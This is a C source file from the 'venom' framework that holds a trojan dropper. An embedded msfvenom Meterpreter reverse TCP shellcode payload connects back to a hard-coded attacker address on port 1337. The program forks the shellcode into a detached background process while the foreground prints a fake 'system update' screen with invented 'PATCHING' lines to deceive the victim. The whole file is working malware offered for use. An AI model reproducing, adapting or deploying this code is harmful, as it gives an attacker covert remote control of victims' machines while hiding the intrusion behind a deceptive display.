#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<unistd.h>

/*
Author: r00t-3xp10it
Framework: venom v1.0.16
gcc -fno-stack-protector -z execstack exec.c -o daemon
*/

/* msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=1337 -f c */
unsigned char kungfu[] =
"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89"
"\xe1\xcd\x80\x97\x5b\x68\xc0\xa8\x01\x47\x68\x02\x00\x05\x39"
"\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0"
"\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05"
"\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9"
"\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd"
"\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80"
"\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00"
"\x00\xcd\x80";

int main()
{
/*
This fork(); function allow us to spawn a new child process (in background). This way i can
execute shellcode in background while continue the execution of the C program in foreground.
Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c
*/
fflush(NULL);
int pid = fork();
   if (pid > 0) {
      /* We are running in parent process (as foreground job). */




      printf("Please Wait, Updating system ..\n\n");
      /* Display system information onscreen to target user */
      sleep(1);system("h=$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \"Hostname   :$h\"");
      system("k=$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \"Kernel     :$k\"");
      system("b=$(hostnamectl | grep 'Boot' | cut -d ':' -f2);echo \"Boot ID    :$b\"");
      sleep(2);printf("\n");
      system("OP=$(hostnamectl | grep 'Operating' | awk {'print $3'});echo \"Hit:1 http://$OP.download/$OP $OP-rolling/contrib\"");
      printf("------------------------------------------------------\n");
      sleep(1);system("for i in 1023.8353.9354:/daemon 7384.8400.8112:/etc/apt 3305.6720.2201:/etc/bin 6539.3167.1200:/etc/cron 4739.0473.4370:/etc/systemd 9164.0257.0034:/etc/passwd 1023.2559.0076:/etc/crontab 3945.4401.5037:/etc/fork.sys 4406.4490.2320:/etc/drive.sys 1288.3309.9955:/etc/PSmanager 1992.9909.1234:/etc/synaptic 4856.4845.6677:/etc/sources.list 4400.0079.0001:/etc/shadow;do dt=$(date|awk {'print $4,$5,$6'});echo \"$dt - PATCHING: $i\" && sleep 1;done");
      printf("------------------------------------------------------\n");
      printf("Please Wait, finishing update process ..\n");
      sleep(2);printf("Done...\n");
   }
   else if (pid == 0) {
      /* We are running in child process (as backgrond job - orphan). */
      setsid();
      void (*ret)() = (void(*)())kungfu;
      ret();
  } return 0;
}
